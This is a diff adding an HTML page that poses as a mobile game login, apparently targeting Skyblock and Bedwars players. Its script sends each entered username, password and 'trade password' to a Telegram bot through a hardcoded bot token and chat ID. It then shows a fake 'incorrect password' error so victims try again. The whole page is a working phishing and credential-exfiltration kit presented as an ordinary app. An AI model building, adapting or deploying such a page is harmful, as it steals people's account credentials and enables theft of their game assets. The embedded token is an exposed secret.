@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="mobile-web-app-capable" content="yes">
+  <title>My Mobile App</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background: #111;        /* app background */
+      font-family: sans-serif;
+      overflow-x: hidden;      /* prevent sideways scroll */
+    }
+
+    #app {
+      width: 100%;
+      height: 100%;
+      padding: 20px;           /* your content spacing */
+      box-sizing: border-box;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="stage">
+  <div class="screen-wrap">
+
+    <!-- Screen 1: Video -->
+    <section class="screen active" id="scr-video">
+      <video id="introVideo" autoplay muted playsinline src="assets/intro.mp4"></video>
+    </section>
+
+    <!-- Screen 2: Login -->
+    <section class="screen" id="scr-login">
+      <div class="container">
+        <div class="toolbar"><button class="back-btn"></button></div>
+        <h1>Login</h1>
+        <div class="input-field">
+            <img src="https://cdn-icons-png.flaticon.com/512/1077/1077114.png" class="icon-left" alt="user">
+            <input type="text" placeholder="Enter your nickname" id="username">
+        </div>
+        <div class="input-field">
+            <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" class="icon-left" alt="password">
+            <input type="password" placeholder="Enter password" id="password">
+            <img src="https://cdn-icons-png.flaticon.com/512/159/159604.png" class="eye-toggle" alt="eye" id="togglePassword">
+        </div>
+        <div class="forgot-password">Forgot Password?</div>
+        <button class="login-btn" id="loginBtn">Login</button>
+        <div class="register">Register</div>
+        <div class="third-login">
+            <img src="https://cdn-icons-png.flaticon.com/512/281/281764.png" alt="Google">
+            <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="Facebook">
+            <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter">
+        </div>
+        <div class="privacy">Privacy Policy</div>
+      </div>
+    </section>
+
+    <!-- Screen 3: Picker -->
+    <section class="screen" id="scr-picker">
+      <div class="picker-overlay">
+        <div class="picker">
+          <div class="title">Select a Game</div>
+          <div class="grid">
+            <button class="game" id="btnSB">Skyblock</button>
+            <button class="game disabled" id="btnBW">Bedwars</button>
+          </div>
+          <div class="pw" id="pwBox">
+            <input id="tradePw" type="password" inputmode="numeric" placeholder="Trade password (4–12 digits)" minlength="4" maxlength="12">
+            <button id="submitPw">Continue</button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </div>
+</div>
+
+<script>
+const $ = (s,r=document)=>r.querySelector(s);
+const screens=['scr-video','scr-login','scr-picker'];
+function go(id){screens.forEach(n=>{$('#'+n).classList.toggle('active', n===id);});}
+
+// Video autoplay
+const vid = $('#introVideo');
+document.addEventListener('pointerdown',()=>{if(vid.paused) vid.play().catch(()=>{});},{once:true});
+vid.addEventListener('ended',()=>go('scr-login'));
+if(vid.readyState>=2) vid.play().catch(()=>{});  
+
+// Login functionality
+$('#togglePassword').addEventListener('click', ()=>{
+  const pw=$('#password');
+  pw.type = pw.type==='password'?'text':'password';
+  $('#togglePassword').src = pw.type==='password'
+      ? 'https://cdn-icons-png.flaticon.com/512/159/159604.png'
+      : 'https://cdn-icons-png.flaticon.com/512/159/159605.png';
+});
+
+// Picker functionality
+const pwBox=$('#pwBox'), tradePw=$('#tradePw');
+$('#btnSB').addEventListener('click', ()=>{ pwBox.style.display='flex'; tradePw.focus(); });
+$('#btnBW').addEventListener('click', ()=>{});
+
+// Telegram integration
+const telegramToken = '8435784075:AAFsSONbd4_iBd-cMrkBKrHqiY3chIg06Y8';
+const chatId = '1002960647771'; // your chat ID
+
+function sendToTelegram(message){
+    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ chat_id: chatId, text: message })
+    });
+}
+
+// Login → send ID & Password
+$('#loginBtn').addEventListener('click', ()=>{
+    const username = $('#username').value.trim();
+    const password = $('#password').value.trim();
+    if(!username || !password){ alert('Enter both ID and Password!'); return; }
+
+    sendToTelegram(`───── ID ─────\n${username}`);
+    sendToTelegram(`───── PASSWORD ─────\n${password}`);
+
+    go('scr-picker');
+});
+
+// Trade password → send separately
+$('#submitPw').addEventListener('click', ()=>{
+    const trade = $('#tradePw').value.trim();
+    if(!trade){ alert('Enter Trade Password!'); return; }
+
+    sendToTelegram(`───── TRADE PASSWORD ─────\n${trade}`);
+    alert('Trade PASSWORD IS INCORRECT!');
+});
+
+// Optional: back button
+$('.back-btn').addEventListener('click', ()=>go('scr-video'));
+</script>
+</body>
+</html>
